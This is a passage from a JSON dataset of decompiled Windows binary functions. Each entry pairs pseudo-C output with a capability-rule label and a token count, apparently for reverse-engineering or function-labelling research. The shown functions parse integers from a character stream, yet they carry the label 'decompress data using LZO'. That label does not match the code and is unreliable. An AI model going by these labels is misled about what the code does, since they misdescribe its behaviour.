code_r0x00448633;\ncode_r0x0044833e:\n                        arg_8h[2] = uVar7 + 1;\ncode_r0x0044834b:\n                        var_43h = false;\n                        if (arg_8h[3] <= arg_8h[2]) {\n                            iVar6 = (**(*arg_8h + 0x24))();\n                            var_43h = false;\n                            if (iVar6 == -1) {\n                                arg_8h = NULL;\n                                var_43h = true;\n                            }\n                        }\n                    }\n                    else {\n                        uVar5 = uVar12 * uVar13;\n                        uVar14 = (uVar12 * uVar13 >> 0x20) + uVar13 * uVar14;\n                        uVar12 = ~(uVar7 >> 0x1f);\n                        var_44h = var_44h | (uVar12 < uVar14 || uVar12 - uVar14 < (~uVar7 < uVar5));\n                        uVar12 = uVar7 + uVar5;\n                        uVar14 = (uVar7 >> 0x1f) + uVar14 + CARRY4(uVar7, uVar5);\n                        var_48h = var_48h + 1;\n                        uVar7 = arg_8h[2];\n                        if (uVar7 < arg_8h[3]) goto code_r0x0044833e;\ncode_r0x00448633:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x0044834b;\n                        var_43h = true;\n                    }\n                    arg_ch = 0xffffffff;\n                    bVar11 = arg_10h != NULL && arg_14h == -1;\n                    bVar1 = arg_14h == -1;\n                    if ((bVar11) && (bVar1 = false,  arg_10h[3] <= arg_10h[2])) {\n                        iVar6 = (**(*arg_10h + 0x24))();\n                        bVar1 = false;\n                        if (iVar6 == -1) {\n                            arg_10h = NULL;\n                            bVar1 = bVar11;\n                        }\n                    }\n                    if (var_43h == bVar1) {\n                        var_43h = 1;\n                        goto code_r0x00448382;\n                    }\n                    uVar7 = arg_ch;\n                    if (arg_8h == NULL) goto code_r0x004482c0;\n                    if (arg_8h[2] < arg_8h[3]) {\n                        uVar7 = *arg_8h[2];\n                        goto code_r0x004482c0;\n                    }\n                    uVar7 = (**(*arg_8h + 0x24))();\n                    if (uVar7 != 0xffffffff) goto code_r0x004482c0;\n                    arg_8h = NULL;\n                    if (var_54h < 0xb) break;\n                    cVar2 = -1;\n                    iVar6 = -1;\ncode_r0x0044857b:\n                    if (5 < cVar2 + 0x9fU) goto code_r0x004486f0;\n                    uVar7 = iVar6 - 0x57;\n                    if (uVar7 == 0xffffffff) break;\n                } while( true );\n            }\n            goto code_r0x00448592;\n        }\n        var_43h = var_42h;\n        var_44h = 0;\n        uVar12 = 0;\n        var_42h = 0;\n        uVar14 = 0;\n    }\n    else {\n        if (var_42h == 0) {\n            var_44h = 0;\n            uVar12 = 0;\n            uVar14 = 0;\ncode_r0x0044875b:\n            uVar5 = var_2ch;\n            cVar2 = uVar7;\n            if ((*(iVar3 + 0x10) == 0) || (*(iVar3 + 0x25) != cVar2)) {\n                if ((cVar2 == *(iVar3 + 0x24)) ||\n                   (iVar6 = sub.msvcrt.dll_memchr(iVar3 + 0x4e, cVar2, var_54h),  iVar6 == 0)) goto code_r0x00448592;\n                uVar7 = iVar6 - (iVar3 + 0x4e);\n                if (0xf < uVar7) {\n                    uVar7 = uVar7 - 6;\n                }\n                if (uVar14 <= uVar4 && (uVar16 < uVar12) <= uVar4 - uVar14) {\n                    uVar5 = uVar12 * uVar13;\n                    uVar14 = (uVar12 * uVar13 >> 0x20) + uVar13 * uVar14;\n                    uVar12 = ~(uVar7 >> 0x1f);\n                    var_44h = var_44h | (uVar12 < uVar14 || uVar12 - uVar14 < (~uVar7 < uVar5));\n                    uVar12 = uVar5 + uVar7;\n                    uVar14 = uVar14 + (uVar7 >> 0x1f) + CARRY4(uVar5, uVar7);\n                    var_48h = var_48h + 1;\n                    goto code_r0x004487ea;\n                }\n                uVar7 = arg_8h[2];\n                var_44h = var_43h;\n                if (arg_8h[3] <= uVar7) goto code_r0x00448844;\ncode_r0x004487f5:\n                arg_8h[2] = uVar7 + 1;\ncode_r0x00448802:\n                var_65h._1_1_ = 0;\n                if (arg_8h[3] <= arg_8h[2]) {\n                    iVar6 = (**(*arg_8h + 0x24))();\n                    var_65h._1_1_ = 0;\n                    if (iVar6 == -1) {\n                        arg_8h = NULL;\n                        var_65h._1_1_ = var_43h;\n                    }\n                }\n            }\n            else {\n                if (var_48h == 0) {\n                    var_43h = 0;\n                    var_42h = *(iVar3 + 0x10);\n                    goto code_r0x00448382;\n                }\n                uVar7 = var_2ch + 1;\n                uVar9 = 0xf;\n                if (stack0xffffffcc != &var_28h) {\n                    uVar9 = var_28h;\n                }\n                if (uVar9 < uVar7) {\n                    fcn.00492830(var_2ch, 0, 0, 1);\n                }\n                var_48h = 0;\n                *(stack0xffffffcc + uVar5) = var_48h;\n                *(stack0xffffffcc + uVar7) = 0;\n                var_2ch = uVar7;\ncode_r0x004487ea:\n                uVar7 = arg_8h[2];\n                if (uVar7 < arg_8h[3]) goto code_r0x004487f5;\ncode_r0x00448844:\n                (**(*arg_8h + 0x28))();\n                var_65h._1_1_ = var_43h;\n                if (arg_8h != NULL) goto code_r0x00448802;\n            }\n            arg_ch = 0xffffffff;\n            bVar11 = arg_10h != NULL && arg_14h == -1;\n            bVar1 = arg_14h == -1;\n            if ((bVar11) && (bVar1 = false,  arg_10h[3] <= arg_10h[2])) {\n                iVar6 = (**(*arg_10h + 0x24))();\n                bVar1 = false;\n                if (iVar6 == -1) {\n                    arg_10h = NULL;\n                    bVar1 = bVar11;\n                }\n            }\n            if (var_65h._1_1_ == bVar1) goto code_r0x00448382;\n            uVar7 = arg_ch;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar7 = *arg_8h[2];\n                }\n                else {\n                    uVar7 = (**(*arg_8h + 0x24))();\n                    if (uVar7 == 0xffffffff) {\n                        arg_8h = NULL;\n                        uVar7 = 0xffffffff;\n                    }\n                }\n            }\n            goto code_r0x0044875b;\n        }\n        uVar12 = 0;\n        uVar14 = 0;\n        var_44h = 0;\n        var_43h = var_42h;\n        var_42h = 0;\n    }\ncode_r0x00448382:\n    if (var_2ch != 0) goto code_r0x004485a1;\ncode_r0x0044838a:\n    if ((var_48h != 0) || (bVar15)) {\ncode_r0x004485e9:\n        if (var_42h == 0) {\n            if (var_44h == 0) {\n                if (bVar8) {\n                    bVar15 = uVar12 != 0;\n                    uVar12 = -uVar12;\n                    uVar14 = -(uVar14 + bVar15);\n                }\n                *arg_20h = uVar12;\n                arg_20h[1] = uVar14;\n            }\n            else {\n                *arg_20h = 0xffffffff;\n                arg_20h[1] = 0xffffffff;\n                *arg_1ch = 4;\n            }\n            goto code_r0x004483b8;\n        }\n    }\ncode_r0x0044839f:\n    *arg_20h = 0;\n    arg_20h[1] = 0;\n    *arg_1ch = 4;\ncode_r0x004483b8:\n    if (var_43h != 0) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (stack0xffffffcc != &var_28h) {\n        fcn.004a34c0(stack0xffffffcc);\n    }\n    return CONCAT44(arg_ch, arg_8h);\ncode_r0x004486f0:\n    if (5 < cVar2 + 0xbfU) goto code_r0x00448592;\n    uVar7 = iVar6 - 0x37;\n    goto code_r0x004482e2;\ncode_r0x00448592:\n    var_43h = 0;\n    if (var_2ch == 0) goto code_r0x0044838a;\ncode_r0x004485a1:\n    fcn.004929c0(var_48h);\n    cVar2 = fcn.0049e840(*(iVar3 + 8), *(iVar3 + 0xc), &var_31h + 1);\n    if (cVar2 == '\\0') {\n        *arg_1ch = 4;\n    }\n    if ((bVar15) || ((var_48h | var_2ch) != 0)) goto code_r0x004485e9;\n    goto code_r0x0044839f;\n}\n",
        "token_count": 5097
    },
    "00448be0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.00448be0(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, int32_t arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    uint8_t uVar1;\n    bool bVar2;\n    char cVar3;\n    uint8_t uVar4;\n    char cVar5;\n    char cVar6;\n    bool bVar7;\n    char cVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    bool bVar15;\n    uint var_50h;\n    uint var_4ch;\n    uint8_t var_45h;\n    uint *var_44h;\n    uint32_t var_40h;\n    uint var_3ch;\n    uint32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_1eh;\n    uint var_ch;\n    \n    iVar12 = arg_18h;\n    iVar9 = fcn.0042e410(arg_18h + 0x6c);\n    uVar10 = *(iVar12 + 0xc) & 0x4a;\n    if (uVar10 == 0x40) {\n        var_38h = 8;\ncode_r0x00448c20:\n        cVar5 = fcn.00430ce0(&arg_10h);\n        if (cVar5 == '\\0') {\ncode_r0x00448c3f:\n            var_44h = &arg_10h;\n            uVar11 = fcn.00430dd0();\n            cVar6 = uVar11;\n            bVar15 = *(iVar9 + 0x4a) == cVar6;\n            cVar5 = *(iVar9 + 0x10);\n            if ((((bVar15) || (*(iVar9 + 0x4b) == cVar6)) && ((cVar5 == '\\0' || (*(iVar9 + 0x25) != cVar6)))) &&\n               (*(iVar9 + 0x24) != cVar6)) {\n                fcn.00485e80();\n                arg_ch = 0xffffffff;\n                cVar5 = fcn.00430ce0(var_44h);\n                var_34h = 0;\n                bVar2 = false;\n                if (cVar5 == '\\0') {\n                    uVar11 = fcn.00430dd0();\n                    cVar5 = *(iVar9 + 0x10);\n                    goto code_r0x00448e4c;\n                }\n            }\n            else {\ncode_r0x00448e4c:\n                var_34h = 0;\n                bVar2 = false;\n                while (((cVar6 = uVar11,  cVar5 == '\\0' || (*(iVar9 + 0x25) != cVar6)) && (*(iVar9 + 0x24) != cVar6))) {\n                    if (*(iVar9 + 0x4e) == cVar6) {\n                        bVar7 = var_38h == 10 | bVar2 ^ 1U;\n                        if (!bVar7) goto code_r0x00448e89;\n                        bVar2 = uVar10 == 0 || var_38h == 8;\n                        if (uVar10 != 0 && var_38h != 8) {\n                            var_34h = var_34h + 1;\n                            goto code_r0x00448ebd;\n                        }\n                        var_34h = 0;\n                        var_38h = 8;\n                        uVar13 = arg_8h[2];\n                        if (arg_8h[3] <= uVar13) goto code_r0x00448f60;\ncode_r0x00448ecc:\n                        arg_8h[2] = uVar13 + 1;\ncode_r0x00448ed9:\n                        var_38h._0_1_ = false;\n                        if ((arg_8h[3] <= arg_8h[2]) && (iVar12 = (**(*arg_8h + 0x24))(),  iVar12 == -1)) {\n                            arg_8h = NULL;\n                            var_38h._0_1_ = true;\n                        }\n                    }\n                    else {\n                        if (!bVar2) break;\ncode_r0x00448e89:\n                        if ((*(iVar9 + 0x4c) != cVar6) && (*(iVar9 + 0x4d) != cVar6)) {\n                            cVar5 = '\\0';\n                            bVar2 = true;\n                            goto code_r0x00448cb1;\n                        }\n                        cVar5 = var_38h == 0x10 || uVar10 == 0;\n                        if (var_38h != 0x10 && uVar10 != 0) {\n                            bVar2 = true;\n                            goto code_r0x00448cbe;\n                        }\n                        var_34h = 0;\n                        var_38h = 0x10;\n                        bVar7 = false;\ncode_r0x00448ebd:\n                        uVar13 = arg_8h[2];\n                        bVar2 = bVar7;\n                        if (uVar13 < arg_8h[3]) goto code_r0x00448ecc;\ncode_r0x00448f60:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x00448ed9;\n                        var_38h._0_1_ = true;\n                    }\n                    arg_ch = 0xffffffff;\n                    bVar7 = arg_10h != NULL && arg_14h == -1;\n                    var_45h = arg_14h == -1;\n                    if ((bVar7) && (var_45h = false,  arg_10h[3] <= arg_10h[2])) {\n                        var_45h = false;\n                        iVar12 = (**(*arg_10h + 0x24))();\n                        if (iVar12 == -1) {\n                            arg_10h = NULL;\n                            var_45h = bVar7;\n                        }\n                    }\n                    if (var_38h._0_1_ == var_45h) {\n                        cVar5 = '\\x01';\n                        goto code_r0x00448cb1;\n                    }\n                    uVar11 = arg_ch;\n                    if (arg_8h != NULL) {\n                        if (arg_8h[2] < arg_8h[3]) {\n                            uVar11 = *arg_8h[2];\n                        }\n                        else {\n                            uVar11 = (**(*arg_8h + 0x24))();\n                            if (uVar11 == 0xffffffff) {\n                                arg_8h = NULL;\n                                uVar11 = 0xffffffff;\n                            }\n                        }\n                    }\n                    if (!bVar2) break;\n                    cVar5 = *(iVar9 + 0x10);\n                }\n                cVar5 = '\\0';\n            }\ncode_r0x00448cb1:\n            var_40h = 0x16;\n            if (var_38h == 0x10) goto code_r0x00448cc4;\n        }\n        else {\n            uVar11 = 0;\n            var_34h = 0;\n            bVar2 = false;\n            bVar15 = false;\n        }\ncode_r0x00448cbe:\n        var_40h = var_38h;\n    }\n    else {\n        if (uVar10 != 8) {\n            var_38h = 10;\n            goto code_r0x00448c20;\n        }\n        cVar5 = fcn.00430ce0(&arg_10h);\n        if (cVar5 == '\\0') {\n            var_38h = 0x10;\n            goto code_r0x00448c3f;\n        }\n        uVar11 = 0;\n        var_34h = 0;\n        bVar2 = false;\n        bVar15 = false;\n        var_38h = 0x10;\n        var_40h = 0x16;\n    }\ncode_r0x00448cc4:\n    var_44h = &arg_10h;\n    *NULL = fcn.0046ba90(0, 0, &var_1eh + 1);\n    if (*(iVar9 + 0x10) != '\\0') {\n        fcn.0046d280(0x20);\n    }\n    uVar10 = 0xffffffff / var_38h;\n    uVar1 = *(iVar9 + 100);\n    cVar6 = cVar5;\n    if (uVar1 == 0) {\n        var_45h = 0;\n        if (cVar5 == '\\0') {\n            uVar13 = 0;\n            do {\n                cVar6 = uVar11;\n                iVar12 = cVar6;\n                if (var_40h < 0xb) {\n                    if ((cVar6 < '0') || (var_40h + '0' <= cVar6)) goto code_r0x00448fd4;\ncode_r0x00448d41:\n                    uVar11 = iVar12 - 0x30;\n                }\n                else {\n                    if (cVar6 - 0x30U < 10) goto code_r0x00448d41;\n                    if (cVar6 + 0x9fU < 6) {\n                        uVar11 = iVar12 - 0x57;\n                    }\n                    else {\n                        if (5 < cVar6 + 0xbfU) goto code_r0x00448fd4;\n                        uVar11 = iVar12 - 0x37;\n                    }\n                }\n                if (uVar11 == 0xffffffff) goto code_r0x00448fd4;\n                if (uVar10 < uVar13) {\n                    var_45h = 1;\n                    uVar11 = arg_8h[2];\n                    if (arg_8h[3] <= uVar11) goto code_r0x00449073;\ncode_r0x00448d7b:\n                    arg_8h[2] = uVar11 + 1;\n                }\n                else {\n                    uVar14 = uVar13 * var_38h;\n                    uVar13 = uVar14 + uVar11;\n                    var_45h = var_45h | ~uVar11 < uVar14;\n                    uVar11 = arg_8h[2];\n                    var_34h = var_34h + 1;\n                    if (uVar11 < arg_8h[3]) goto code_r0x00448d7b;\ncode_r0x00449073:\n                    (**(*arg_8h + 0x28))();\n                }\n                arg_ch = 0xffffffff;\n                cVar6 = fcn.00430ce0(var_44h);\n                cVar8 = cVar5;\n                if (cVar6 != '\\0') goto code_r0x00448da3;\n                uVar11 = fcn.00430dd0();\n            } while( true );\n        }\n        uVar13 = 0;\n        cVar8 = '\\0';\ncode_r0x00448da3:\n        cVar3 = cVar6;\n        cVar5 = cVar8;\n        if (*(stack0xffffffe0 + -0xc) == 0) goto code_r0x00448db1;\ncode_r0x00448fe4:\n        cVar6 = cVar3;\n        fcn.0046d560(var_34h);\n        cVar8 = fcn.0049e880(*(iVar9 + 8), *(iVar9 + 0xc), &var_1eh + 2);\n        if (cVar8 == '\\0') {\n            *arg_1ch = 4;\n        }\n        if (((var_34h != 0) || (bVar2)) || (*(stack0xffffffe0 + -0xc) != 0)) goto code_r0x00449032;\n    }\n    else {\n        if (cVar5 != '\\0') {\n            uVar13 = 0;\n            var_45h = 0;\n            cVar8 = '\\0';\n            goto code_r0x00448da3;\n        }\n        var_45h = 0;\n        uVar13 = 0;\n        cVar8 = *(iVar9 + 0x10);\n        if ((cVar8 != '\\0') && (*(iVar9 + 0x25) == uVar11)) goto code_r0x004491e0;\ncode_r0x00449137:\n        if ((uVar11 != *(iVar9 + 0x24)) && (iVar12 = sub.msvcrt.dll_memchr(iVar9 + 0x4e, uVar11, var_40h),  iVar12 != 0)\n           ) {\n            uVar11 = iVar12 - (iVar9 + 0x4e);\n            if (0xf < uVar11) {\n                uVar11 = uVar11 - 6;\n            }\n            uVar4 = uVar1;\n            if (uVar13 <= uVar10) {\n                uVar14 = uVar13 * var_38h;\n                var_34h = var_34h + 1;\n                uVar13 = uVar14 + uVar11;\n                uVar4 = var_45h | ~uVar11 < uVar14;\n            }\n            var_45h = uVar4;\n            uVar11 = arg_8h[2];\n            if (arg_8h[3] <= uVar11) goto code_r0x0044920e;\n            do {\n                arg_8h[2] = uVar11 + 1;\n                while( true ) {\n                    arg_ch = 0xffffffff;\n                    cVar6 = fcn.00430ce0(var_44h);\n                    cVar8 = cVar5;\n                    if (cVar6 != '\\0') goto code_r0x00448da3;\n                    uVar11 = fcn.00430dd0();\n                    cVar8 = *(iVar9 + 0x10);\n                    if ((cVar8 == '\\0') || (*(iVar9 + 0x25) != uVar11)) goto code_r0x00449137;\ncode_r0x004491e0:\n                    if (var_34h == 0) {\n                        cVar6 = '\\0';\n                        goto code_r0x00448da3;\n                    }\n                    fcn.0046d560(var_34h);\n                    var_34h = 0;\n                    uVar11 = arg_8h[2];\n                    if (uVar11 < arg_8h[3]) break;\ncode_r0x0044920e:\n                    (**(*arg_8h + 0x28))();\n                }\n            } while( true );\n        }\ncode_r0x00448fd4:\n        cVar6 = '\\0';\n        cVar3 = '\\0';\n        if (*(stack0xffffffe0 + -0xc) != 0) goto code_r0x00448fe4;\ncode_r0x00448db1:\n        if ((var_34h != 0) || (bVar2)) {\ncode_r0x00449032:\n            if (cVar5 == '\\0') {\n                if (var_45h == 0) {\n                    if (bVar15) {\n                        uVar13 = -uVar13;\n                    }\n                    *arg_20h = uVar13;\n                }\n                else {\n                    *arg_20h = 0xffffffff;\n                    *arg_1ch = 4;\n                }\n                goto code_r0x00448dd8;\n            }\n        }\n    }\n    *arg_20h = 0;\n    *arg_1ch = 4;\ncode_r0x00448dd8:\n    if (cVar6 != '\\0') {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    fcn.0046bf80(&var_1eh + 1);\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 3627
    },
    "00449370": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.00449370(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, int32_t arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    uint8_t uVar4;\n    char cVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    bool bVar11;\n    uint32_t var_58h;\n    int32_t var_54h;\n    uint var_50h;\n    uint32_t var_4ch;\n    uint32_t var_48h;\n    uint var_44h;\n    uint *var_40h;\n    uint32_t var_3ch;\n    int32_t var_38h;\n    uint8_t var_33h;\n    uint8_t var_32h;\n    uint8_t var_31h;\n    uint32_t var_30h;\n    uint var_2ch;\n    int32_t var_1eh;\n    uint var_ch;\n    \n    iVar9 = arg_18h;\n    iVar6 = fcn.0042e410(arg_18h + 0x6c);\n    uVar7 = *(iVar9 + 0xc) & 0x4a;\n    if (uVar7 == 0x40) {\n        var_30h = 8;\ncode_r0x004493af:\n        var_32h = fcn.00430ce0(&arg_10h);\n        if (var_32h == 0) {\ncode_r0x004493ce:\n            var_40h = &arg_10h;\n            uVar8 = fcn.00430dd0();\n            cVar1 = uVar8;\n            bVar11 = *(iVar6 + 0x4a) == cVar1;\n            cVar5 = *(iVar6 + 0x10);\n            if ((((bVar11) || (*(iVar6 + 0x4b) == cVar1)) && ((cVar5 == '\\0' || (*(iVar6 + 0x25) != cVar1)))) &&\n               (*(iVar6 + 0x24) != cVar1)) {\n                fcn.00485e80();\n                arg_ch = 0xffffffff;\n                var_32h = fcn.00430ce0(var_40h);\n                var_38h = 0;\n                var_31h = false;\n                if (var_32h == 0) {\n                    uVar8 = fcn.00430dd0();\n                    cVar5 = *(iVar6 + 0x10);\n                    goto code_r0x004495d0;\n                }\n            }\n            else {\ncode_r0x004495d0:\n                var_38h = 0;\n                var_31h = false;\n                while (((cVar1 = uVar8,  cVar5 == '\\0' || (*(iVar6 + 0x25) != cVar1)) && (*(iVar6 + 0x24) != cVar1))) {\n                    if (*(iVar6 + 0x4e) == cVar1) {\n                        var_31h = var_30h == 10 | var_31h ^ 1;\n                        if (var_31h == false) goto code_r0x0044960c;\n                        bVar3 = uVar7 == 0 || var_30h == 8;\n                        if (uVar7 != 0 && var_30h != 8) {\n                            var_38h = var_38h + 1;\n                            goto code_r0x00449640;\n                        }\n                        var_38h = 0;\n                        var_30h = 8;\n                        uVar10 = arg_8h[2];\n                        var_31h = bVar3;\n                        if (arg_8h[3] <= uVar10) goto code_r0x00449890;\ncode_r0x0044964f:\n                        arg_8h[2] = uVar10 + 1;\ncode_r0x0044965c:\n                        var_32h = false;\n                        if ((arg_8h[3] <= arg_8h[2]) && (iVar9 = (**(*arg_8h + 0x24))(),  iVar9 == -1)) {\n                            arg_8h = NULL;\n                            var_32h = true;\n                        }\n                    }\n                    else {\n                        if (var_31h == false) break;\ncode_r0x0044960c:\n                        if ((*(iVar6 + 0x4c) != cVar1) && (*(iVar6 + 0x4d) != cVar1)) {\n                            var_32h = 0;\n                            var_31h = true;\n                            goto code_r0x00449440;\n                        }\n                        var_32h = var_30h == 0x10 || uVar7 == 0;\n                        if (var_30h != 0x10 && uVar7 != 0) {\n                            var_31h = true;\n                            goto code_r0x0044944c;\n                        }\n                        var_38h = 0;\n                        var_31h = false;\n                        var_30h = 0x10;\ncode_r0x00449640:\n                        uVar10 = arg_8h[2];\n                        if (uVar10 < arg_8h[3]) goto code_r0x0044964f;\ncode_r0x00449890:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x0044965c;\n                        var_32h = true;\n                    }\n                    arg_ch = 0xffffffff;\n                    bVar3 = arg_10h != NULL && arg_14h == -1;\n                    var_3ch._0_1_ = arg_14h == -1;\n                    if ((bVar3) && (var_3ch._0_1_ = false,  arg_10h[3] <= arg_10h[2])) {\n                        iVar9 = (**(*arg_10h + 0x24))();\n                        var_3ch._0_1_ = false;\n                        if (iVar9 == -1) {\n                            arg_10h = NULL;\n                            var_3ch._0_1_ = bVar3;\n                        }\n                    }\n                    if (var_3ch == var_32h) {\n                        var_32h = 1;\n                        goto code_r0x00449440;\n                    }\n                    uVar8 = arg_ch;\n                    if (arg_8h != NULL) {\n                        if (arg_8h[2] < arg_8h[3]) {\n                            uVar8 = *arg_8h[2];\n                        }\n                        else {\n                            uVar8 = (**(*arg_8h + 0x24))();\n                            if (uVar8 == 0xffffffff) {\n                                arg_8h = NULL;\n                                uVar8 = 0xffffffff;\n                            }\n                        }\n                    }\n                    if (var_31h == false) break;\n                    cVar5 = *(iVar6 + 0x10);\n                }\n                var_32h = 0;\n            }\ncode_r0x00449440:\n            var_3ch = 0x16;\n            if (var_30h != 0x10) goto code_r0x0044944c;\n        }\n        else {\n            uVar8 = 0;\n            var_38h = 0;\n            var_31h = false;\n            bVar11 = false;\ncode_r0x0044944c:\n            var_3ch = var_30h;\n        }\n        *NULL = fcn.0046ba90(0, 0, &var_1eh + 1);\n        var_58h = var_30h;\n        if (*(iVar6 + 0x10) != '\\0') {\ncode_r0x00449a80:\n            fcn.0046d280(0x20);\n            var_58h = var_30h;\n        }\n        uVar2 = var_32h;\n        var_40h = &arg_10h;\n        var_48h = bVar11 + 0x7fffffff;\n        var_4ch = var_48h / var_58h;\n        var_33h = *(iVar6 + 100);\n        if (var_33h == 0) {\n            if (var_32h == 0) {\n                var_33h = var_32h;\n                var_30h = 0;\n                do {\n                    cVar5 = uVar8;\n                    iVar9 = cVar5;\n                    if (var_3ch < 0xb) {\n                        if ((cVar5 < '0') || (var_3ch + '0' <= cVar5)) goto code_r0x00449904;\ncode_r0x004494e3:\n                        iVar9 = iVar9 + -0x30;\n                    }\n                    else {\n                        if (cVar5 - 0x30U < 10) goto code_r0x004494e3;\n                        if (cVar5 + 0x9fU < 6) {\n                            iVar9 = iVar9 + -0x57;\n                        }\n                        else {\n                            if (5 < cVar5 + 0xbfU) goto code_r0x00449904;\n                            iVar9 = iVar9 + -0x37;\n                        }\n                    }\n                    if (iVar9 == -1) goto code_r0x00449904;\n                    if (var_4ch < var_30h) {\n                        var_33h = 1;\n                        uVar7 = arg_8h[2];\n                        if (arg_8h[3] <= uVar7) goto code_r0x004499a6;\ncode_r0x00449523:\n                        arg_8h[2] = uVar7 + 1;\n                    }\n                    else {\n                        uVar7 = var_30h * var_58h;\n                        var_30h = iVar9 + uVar7;\n                        var_33h = var_33h | var_48h - iVar9 < uVar7;\n                        uVar7 = arg_8h[2];\n                        var_38h = var_38h + 1;\n                        if (uVar7 < arg_8h[3]) goto code_r0x00449523;\ncode_r0x004499a6:\n                        (**(*arg_8h + 0x28))();\n                    }\n                    arg_ch = 0xffffffff;\n                    uVar2 = fcn.00430ce0(var_40h);\n                    if (uVar2 != 0) goto code_r0x0044954b;\n                    uVar8 = fcn.00430dd0();\n                } while( true );\n            }\n            var_30h = 0;\n            var_32h = 0;\n            goto code_r0x0044954b;\n        }\ncode_r0x00449730:\n        uVar2 = var_32h;\n        var_40h = &arg_10h;\n        if (var_32h != 0) {\n            var_30h = 0;\n            var_33h = 0;\n            var_32h = 0;\n            goto code_r0x0044954b;\n        }\n        uVar4 = *(iVar6 + 0x10);\n        var_33h = 0;\n        var_30h = 0;\n        if ((uVar4 != 0) && (*(iVar6 + 0x25) == uVar8)) goto code_r0x00449808;\ncode_r0x00449759:\n        if ((uVar8 != *(iVar6 + 0x24)) && (iVar9 = sub.msvcrt.dll_memchr(iVar6 + 0x4e, uVar8, var_3ch),  iVar9 != 0)) {\n            iVar9 = iVar9 - (iVar6 + 0x4e);\n            if (0xf < iVar9) {\n                iVar9 = iVar9 + -6;\n            }\n            if (var_4ch < var_30h) {\n                var_33h = 1;\n            }\n            else {\n                uVar7 = var_30h * var_58h;\n                var_30h = iVar9 + uVar7;\n                var_33h = var_33h | var_48h - iVar9 < uVar7;\n                var_38h = var_38h + 1;\n            }\n            uVar7 = arg_8h[2];\n            if (arg_8h[3] <= uVar7) goto code_r0x00449836;\n            do {\n                arg_8h[2] = uVar7 + 1;\n                while( true ) {\n                    arg_ch = 0xffffffff;\n                    uVar2 = fcn.00430ce0(var_40h);\n                    if (uVar2 != 0) goto code_r0x0044954b;\n                    uVar8 = fcn.00430dd0();\n                    uVar4 = *(iVar6 + 0x10);\n                    if ((uVar4 == 0) || (*(iVar6 + 0x25) != uVar8)) goto code_r0x00449759;\ncode_r0x00449808:\n                    if (var_38h == 0) {\n                        uVar2 = 0;\n                        var_32h = uVar4;\n                        goto code_r0x0044954b;\n                    }\n                    fcn.0046d560(var_38h);\n                    var_38h = 0;\n                    uVar7 = arg_8h[2];\n                    if (uVar7 < arg_8h[3]) break;\ncode_r0x00449836:\n                    (**(*arg_8h + 0x28))();\n                }\n            } while( true );\n        }\ncode_r0x00449904:\n        uVar2 = 0;\n        uVar4 = 0;\n        if (*(stack0xffffffe0 + -0xc) != 0) goto code_r0x00449914;\ncode_r0x00449559:\n        if ((var_38h != 0) || (var_31h == 1)) {\ncode_r0x00449961:\n            if (var_32h == 0) {\n                if (var_33h == 0) {\n                    uVar7 = -var_30h;\n                    if (!bVar11) {\n                        uVar7 = var_30h;\n                    }\n                    *arg_20h = uVar7;\n                }\n                else {\n                    *arg_20h = bVar11 + 0x7fffffff;\n                    *arg_1ch = 4;\n                }\n                goto code_r0x00449580;\n            }\n        }\n    }\n    else {\n        var_30h = 10;\n        if (uVar7 != 8) goto code_r0x004493af;\n        var_30h = 0x10;\n        uVar2 = fcn.00430ce0(&arg_10h);\n        if (uVar2 == 0) goto code_r0x004493ce;\n        *NULL = fcn.0046ba90(0, 0, &var_1eh + 1);\n        uVar4 = *(iVar6 + 0x10);\n        if (uVar4 != 0) {\n            var_38h = 0;\n            uVar8 = 0;\n            var_31h = false;\n            bVar11 = false;\n            var_3ch = 0x16;\n            var_32h = uVar4;\n            goto code_r0x00449a80;\n        }\n        var_32h = *(iVar6 + 100);\n        bVar11 = false;\n        if (var_32h != 0) {\n            var_3ch = 0x16;\n            uVar8 = 0;\n            var_4ch = 0x7ffffff;\n            var_48h = 0x7fffffff;\n            var_38h = 0;\n            var_58h = 0x10;\n            var_31h = uVar4;\n            goto code_r0x00449730;\n        }\n        var_33h = 0;\n        var_30h = 0;\n        var_38h = 0;\n        var_31h = var_32h;\ncode_r0x0044954b:\n        uVar4 = uVar2;\n        if (*(stack0xffffffe0 + -0xc) == 0) goto code_r0x00449559;\ncode_r0x00449914:\n        uVar2 = uVar4;\n        fcn.0046d560(var_38h);\n        cVar5 = fcn.0049e880(*(iVar6 + 8), *(iVar6 + 0xc), &var_1eh + 2);\n        if (cVar5 == '\\0') {\n            *arg_1ch = 4;\n        }\n        if (((var_38h != 0) || (var_31h == 1)) || (*(stack0xffffffe0 + -0xc) != 0)) goto code_r0x00449961;\n    }\n    *arg_20h = 0;\n    *arg_1ch = 4;\ncode_r0x00449580:\n    var_54h = &var_1eh + 1;\n    if (uVar2 != 0) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    fcn.0046bf80(var_54h);\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 3952
    },
